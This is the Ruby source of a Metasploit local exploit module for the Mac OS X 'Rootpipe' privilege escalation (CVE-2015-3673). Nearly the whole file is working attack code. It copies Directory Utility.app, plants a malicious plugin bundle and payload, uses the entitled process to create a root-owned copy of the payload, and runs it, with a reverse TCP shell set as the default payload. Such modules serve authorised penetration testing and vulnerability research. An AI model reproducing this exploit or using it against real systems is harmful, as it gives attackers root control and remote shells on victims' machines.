# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Local

  Rank = GreatRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apple OS X Entitlements Rootpipe Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the rootpipe vulnerability and bypasses Apple&#039;s initial
        fix for the issue by injecting code into a process with the &#039;admin.writeconfig&#039;
        entitlement.
      },
      &#039;Author&#039;         => [
        &#039;Emil Kvarnhammar&#039;, # Vulnerability discovery and PoC
        &#039;joev&#039;              # Copy/paste monkey
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;,   &#039;2015-3673&#039;],
      ],
      &#039;DisclosureDate&#039; => &#039;Jul 1 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;osx&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Mac OS X 10.9-10.10.3&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039;         => &#039;osx/x64/shell_reverse_tcp&#039;,
        &#039;PrependSetreuid&#039; => true
      }
    ))

    register_options([
      OptString.new(&#039;WRITABLEDIR&#039;, [true, &#039;Writable directory&#039;, &#039;/.Trashes&#039;])
    ])
  end

  def check
    if ver? && admin?
      vprint_status("Version is between 10.9 and 10.10.3, and is admin.")
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("Copying Directory Utility.app to #{new_app}")
    cmd_exec("cp -R &#039;/System/Library/CoreServices/Applications/Directory Utility.app&#039; &#039;#{new_app}&#039;")
    cmd_exec("mkdir -p &#039;#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS&#039;")

    print_status("Writing bundle plist to `#{plist_file}&#039;")
    write_file(plist_file, plist)

    print_status("Writing payload to `#{payload_file}&#039;")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)

    print_status("Writing malicious shared library to `#{exploit_file}&#039;")
    write_file(exploit_file, plugin_exploit)

    print_status("Running Directory Utility.app")
    cmd_exec("/bin/sh -c &#039;PAYLOAD_IN="+payload_file+" PAYLOAD_OUT="+root_file+" #{new_app}/Contents/MacOS/Directory\\ Utility&#039;")

    print_status("Deleting Directory Utility.app")
    cmd_exec(&#039;rm -Rf "#{new_app}"&#039;)

    print_status(&#039;Executing payload...&#039;)
    cmd_exec("/bin/sh -c &#039;#{root_file} &&#039;")
  end

  def ver?
    Gem::Version.new(get_sysinfo[&#039;ProductVersion&#039;]).between?(
      Gem::Version.new(&#039;10.9&#039;), Gem::Version.new(&#039;10.10.3&#039;)
    )
  end

  def admin?
    cmd_exec(&#039;groups | grep -wq admin && echo true&#039;) == &#039;true&#039;
  end

  def sploit
    "#{datastore[&#039;PYTHON&#039;]} #{exploit_file} #{payload_file} #{payload_file}"
  end

  def plugin_exploit
    File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-3673&#039;, &#039;exploit.daplug&#039;
    ))
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def exploit_file
    "#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS/RootpipeBundle"
  end

  def plist_file
    "#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/Info.plist"
  end

  def new_app
    @app ||= "#{datastore[&#039;WRITABLEDIR&#039;]}/#{Rex::Text.rand_text_alpha(8)}.app"
  end

  def plist
    %Q|
      <?xml version="1.0" encoding="UTF-8"?>
      <plist version="1.0">
      <dict>
        <key>CFBundleGetInfoString</key>
        <string>RootpipeBundle</string>
        <key>CFBundleExecutable</key>
        <string>RootpipeBundle</string>
        <key>CFBundleIdentifier</key>
        <string>com.root.pipe</string>
        <key>CFBundleName</key>
        <string>RootpipeBundle</string>
        <key>CFBundleShortVersionString</key>
        <string>0.01</string>
        <key>CFBundleInfoDictionaryVersion</key>
        <string>6.0</string>
        <key>CFBundlePackageType</key>
        <string>APPL</string>
        <key>IFMajorVersion</key>
        <integer>0</integer>
        <key>IFMinorVersion</key>
        <integer>1</integer>
      </dict>
      </plist>
    |
  end

  def payload_file
    @payload_file ||=
      "#{datastore[&#039;WRITABLEDIR&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

  def root_file
    @root_file ||=
      "#{datastore[&#039;WRITABLEDIR&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

end

